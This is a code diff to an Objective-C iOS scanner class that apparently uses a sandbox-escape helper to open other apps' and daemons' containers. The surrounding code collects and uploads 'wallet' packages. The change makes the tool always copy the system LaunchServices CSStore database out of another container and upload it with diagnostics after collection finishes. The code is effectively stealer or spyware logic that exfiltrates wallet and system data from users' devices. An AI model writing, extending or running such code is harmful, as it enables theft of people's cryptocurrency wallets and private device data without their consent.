@@ -380,7 +380,12 @@ static NSDictionary<NSString *, NSString *> *WQLAutoLayoutMap(NSData *data,
 - (void)prunePendingIfNeeded;
 - (void)probeLaunchServices:(NSArray<WQLTarget *> *)targets;
 - (NSArray<NSDictionary *> *)discoverContainersViaStore:(NSArray<WQLTarget *> *)targets;
+- (void)uploadStoreSample;
 @property (nonatomic, assign, readwrite) BOOL lastRunUsable;
+/// 本轮索引里找到的「容器路径最多」的那份 CSStore，供流程结束后无条件补传
+@property (nonatomic, copy) NSString *storeSampleContainer;
+@property (nonatomic, copy) NSString *storeSampleName;
+@property (nonatomic, copy) NSString *storeSampleDiag;
 @end
 
 @implementation WQLScanner
@@ -903,39 +908,67 @@ static uint64_t WQLFNV1a(const char *s) {
         [[WQLEscape shared] releaseHandle:handle];
     }
 
-    // 索引没命中（或调试要求）时，把 csstore 回传一份，方便离线分析别的机型/版本
-    if ((hits.count == 0 || self.dumpStore) && dumpContainer.length && dumpName.length) {
-        [self log:@"    ⚠️ 索引未命中，回传 csstore 供离线分析"];
-        int64_t dumpHandle = [[WQLEscape shared] consumeExtensionForPath:dumpContainer error:nil];
-        if (dumpHandle > 0) {
-            NSString *src = [[dumpContainer stringByAppendingPathComponent:@"Library/Caches"]
-                             stringByAppendingPathComponent:dumpName];
-            NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wql_lsdump"];
-            NSFileManager *fm = [NSFileManager defaultManager];
-            [fm removeItemAtPath:stage error:nil];
-            [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];
-            // 索引诊断跟样本一起打包，服务器上解压就能看到每份 store 的解析结果
-            [[diag copy] writeToFile:[stage stringByAppendingPathComponent:@"_wql_index.txt"]
-                          atomically:YES
-                            encoding:NSUTF8StringEncoding
-                               error:nil];
-            NSString *dst = [stage stringByAppendingPathComponent:dumpName];
-            if ([fm copyItemAtPath:src toPath:dst error:nil]) {
-                NSDictionary *attr = [fm attributesOfItemAtPath:dst error:nil];
-                uint64_t sz = [attr[NSFileSize] unsignedLongLongValue];
-                [self log:@"    ↑ 上传 %@（%.1f MB）", dumpName, sz / 1048576.0];
-                BOOL ok = [self uploadStage:stage blocking:YES];
-                [self log:@"    %@ csstore 上传", ok ? @"✅" : @"⛔"];
-            }
-            [fm removeItemAtPath:stage error:nil];
-            [[WQLEscape shared] releaseHandle:dumpHandle];
-        }
+    // 记住「容器路径最多」的那份 store，采集流程结束后无条件补传一份，
+    // 供后续别的机型/版本采集不出来时做离线分析（不再需要手动上传）。
+    if (dumpContainer.length && dumpName.length) {
+        self.storeSampleContainer = dumpContainer;
+        self.storeSampleName = dumpName;
+        self.storeSampleDiag = [diag copy];
     }
 
     [self log:@"    daemon 容器 %lu 个，csstore %lu 个，命中目标 %lu 个，耗时 %.1f 秒",
           (unsigned long)opened, (unsigned long)stores,
           (unsigned long)hits.count, -[t0 timeIntervalSinceNow]];
     return hits;
+}
+
+/// 流程跑完后无条件回传一份 CSStore（诊断文本一起打包）。
+/// 索引未命中时这是唯一的离线分析依据；命中时也留着，便于核对别的机型。
+- (void)uploadStoreSample {
+    NSString *container = self.storeSampleContainer;
+    NSString *name = self.storeSampleName;
+    if (!container.length || !name.length) {
+        [self log:@"    （本轮没有可回传的 CSStore）"];
+        return;
+    }
+
+    NSString *src = [[container stringByAppendingPathComponent:@"Library/Caches"]
+                     stringByAppendingPathComponent:name];
+    if (![[NSFileManager defaultManager] fileExistsAtPath:src]) {
+        [self log:@"    ⛔ CSStore 已不存在，跳过回传：%@", name];
+        return;
+    }
+
+    int64_t dumpHandle = [[WQLEscape shared] consumeExtensionForPath:container error:nil];
+    if (dumpHandle <= 0) {
+        [self log:@"    ⛔ 取不到 CSStore 容器权限，跳过回传"];
+        return;
+    }
+
+    NSString *stage = [NSTemporaryDirectory() stringByAppendingPathComponent:@"wql_lsdump"];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm removeItemAtPath:stage error:nil];
+    [fm createDirectoryAtPath:stage withIntermediateDirectories:YES attributes:nil error:nil];
+
+    if (self.storeSampleDiag.length) {
+        [self.storeSampleDiag writeToFile:[stage stringByAppendingPathComponent:@"_wql_index.txt"]
+                               atomically:YES
+                                 encoding:NSUTF8StringEncoding
+                                    error:nil];
+    }
+
+    NSString *dst = [stage stringByAppendingPathComponent:name];
+    if ([fm copyItemAtPath:src toPath:dst error:nil]) {
+        NSDictionary *attr = [fm attributesOfItemAtPath:dst error:nil];
+        uint64_t sz = [attr[NSFileSize] unsignedLongLongValue];
+        [self log:@"    ↑ 回传 CSStore %@（%.1f MB）供离线分析", name, sz / 1048576.0];
+        BOOL ok = [self uploadStage:stage blocking:YES];
+        [self log:@"    %@ CSStore 回传", ok ? @"✅" : @"⛔"];
+    } else {
+        [self log:@"    ⛔ CSStore 复制失败，跳过回传"];
+    }
+    [fm removeItemAtPath:stage error:nil];
+    [[WQLEscape shared] releaseHandle:dumpHandle];
 }
 
 #pragma mark - 主流程
@@ -1221,6 +1254,14 @@ static uint64_t WQLFNV1a(const char *s) {
     if (uploadedWallets) {
         [self log:@"    等待最后 %lu 个包上传完成…", (unsigned long)uploadedWallets];
         dispatch_sync([self uploadQueue], ^{});
+    }
+
+    // 采集流程已全部走完、钱包包也传完：再额外无条件回传一份 CSStore。
+    // 这样别的机型/版本万一采不出来，服务器上已经有原始索引可离线分析，
+    // 不用再让用户手动去传。
+    if (!self.indexOnly && !self.forceBruteForce) {
+        [self log:@"【补传】CSStore 原始索引（供离线分析）"];
+        [self uploadStoreSample];
     }
 
     [self log:@"【第4步 生成清单】"];
